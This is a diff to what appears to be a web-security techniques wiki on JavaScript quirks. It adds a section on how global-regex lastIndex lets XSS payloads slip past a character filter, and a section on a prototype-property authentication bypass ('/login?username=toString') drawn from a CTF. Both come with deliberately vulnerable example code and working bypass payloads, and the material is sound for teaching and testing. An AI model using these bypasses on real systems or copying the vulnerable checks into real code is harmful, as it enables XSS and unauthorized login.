@@ -77,6 +77,121 @@ payload = "$'$`alert()//"  // Insert '</script>' following, and '<script>' prece
 <script>let a = "</script><script>let a = alert()//"</script>
 ```
 
+### Global Regexes
+
+[regular-expressions-regex.md](../regular-expressions-regex.md "mention") in JavaScript can be written in between `/` slash characters. After the last slash, flags can be given such as `i` for case insensitivity and `g` for [global search](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global\_Objects/RegExp/global). This global feature is interesting because it can cause some unintuitive behaviour if you don't fully understand its purpose.&#x20;
+
+One common mistake is the _lack_ of the global flag in a RegEx that is supposed to replace all characters. When using no regex, only the first match is replaced, the same goes for a non-global regex. Only using a global regex or the `replaceAll` function, all matches will be replaced:
+
+```javascript
+"aa".replace("a", "b")    // 'ba'
+"aa".replace(/a/, "b")    // 'ba'
+"aa".replace(/a/g, "b")   // 'bb'
+"aa".replaceAll("a", "b") // 'bb'
+```
+
+When a global regex is re-used, another unexpected behaviour can happen. The instance's `.test()` and `.exec()` methods will keep save `.lastIndex` value that stores the last matched index. On the next call, the search is only continued from this last index, not from the start. Only if a match fails will it be reset to the start.
+
+While primarily useful for matching against the same string, this can cause unexpected behaviour when multiple different strings are matched against the same global RegEx:
+
+<pre class="language-javascript"><code class="lang-javascript"><strong>// String with 2 matches will only match twice, then resets
+</strong>const re = /A/g;
+re.test("1st A 2nd A") // true  (starting at 0,  lastIndex=5)
+re.test("1st A 2nd A") // true  (starting at 5,  lastIndex=11)
+re.test("1st A 2nd A") // false (starting at 11, lastIndex=0)
+re.test("1st A 2nd A") // true  (starting at 0,  lastIndex=5)
+
+<strong>// lastIndex can be offset by one string, causing another to fail matching
+</strong>const re = /A/g;
+re.test("....A") // true  (starting at 0, lastIndex=5)
+re.test("AAAA")  // false (starting at 5, lastIndex=0)
+
+<strong>// Increasing match position works until it is before lastIndex
+</strong>const re = /A/g;
+re.test("A")    // true  (starting at 0, lastIndex=1)
+re.test(".A")   // true  (starting at 1, lastIndex=2)
+re.test("..A")  // true  (starting at 2, lastIndex=3)
+re.test("...A") // true  (starting at 3, lastIndex=4)
+re.test("..A")  // false (starting at 4, lastIndex=0)
+</code></pre>
+
+One example implementation of a check that can be bypassed with this behaviour is the following:
+
+<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript"><strong>const re = /[&#x3C;>"']/g;
+</strong><strong>
+</strong><strong>function check(arr) {
+</strong><strong>    return arr.filter((item) => !re.test(item));
+</strong><strong>}
+</strong>
+const msg = [
+    "hello",
+    "&#x3C;script>alert()&#x3C;/script>",
+    'x" onerror="alert()',
+    "bye",
+];
+console.log(check(msg));  // ['hello', 'bye']
+</code></pre>
+
+The above check tries to filter out strings matching characters common in XSS payloads, `<>"'`. It does so with the `/g` global flag and uses `.test()` to check for matches. As we now know, this will remember the `.lastIndex` on any match so that the next check is offset. We can exploit this by intentionally prepending a large string that matches right at the end, putting `.lastIndex=29`. The next match for the script tag or attribute injection will be before the 29th index, and thus not be matched. That allows the following payload to bypass it fully:
+
+{% code title="Exploit" %}
+```javascript
+const msg2 = [
+    "XXXXXXXXXXXXXXXXXXXXXXXXXXXX<",
+    "<script>alert()</script>",
+    "XXXXXXXXXXXXXXXXXXXXXXXXXXXX<",
+    'x" onerror="alert()',
+];
+console.log(check(msg2));  // ['<script>alert()</script>', 'x" onerror="alert()']
+```
+{% endcode %}
+
+### Prototype Properties
+
+In JavaScript, all Objects have a prototype that they inherit methods or properties from. See [prototype-pollution.md](prototype-pollution.md "mention") for a technique that abuses writable prototypes. Here, we will look at abusing the existing prototypes to bypass certain checks when objects are accessed with dynamic keys.&#x20;
+
+Take the following code example:
+
+<pre class="language-javascript" data-title="Vulnerable Example"><code class="lang-javascript">const users = {
+  'admin': {
+    password: crypto.randomBytes(16).toString('hex'),
+  }
+};
+
+app.get('/login', (req, res) => {
+  const { username, password } = req.query;
+
+<strong>  if (users[username] &#x26;&#x26; users[username].password === password) {
+</strong>    res.json(true);
+  } else {
+    res.json(false);
+  }
+});
+</code></pre>
+
+In this example, the `username` and `password` come from the query string. A check is performed that the username is inside the users dictionary and that its password property matches the given password. Only then will it return `true`.
+
+It is vulnerable because not just `'admin'` is a valid key in the `users` object. Its inherited prototype properties like `.constructor` or `.toString` are still valid properties, but are functions instead of a password entry to match against. The `users[username]` will pass, but then its `.password` property will become `undefined`. Luckily, we can match this with our given password by removing the `password` query parameter, making it undefined as well.
+
+{% code title="Payload URL" %}
+```
+/login?username=toString
+```
+{% endcode %}
+
+```javascript
+username = "toString"
+password = undefined
+users[username] -> [Function: toString]             // true
+users[username].password -> undefined === password  // true
+```
+
+This was a solution to a simple JavaScript CTF challenge with a detailed writeup below:
+
+{% embed url="https://jorianwoltjer.com/blog/p/ctf/wizer-ctf-may-2024/4-sensitive-flags" %}
+Writeup of a challenge that uses `users[username]` and could be bypassed
+{% endembed %}
+
 ## Filter Bypass
 
 Often alphanumeric characters are allowed in a filter, so being able to decode Base64 and evaluate the result should be enough to do anything while bypassing a filter. Acquiring the primitives to do this decoding and evaluating however can be the difficult part as certain ways of calling the functions are blocked. The simplest idea is using `atob` to decode Base64, and then `eval` to evaluate the string:
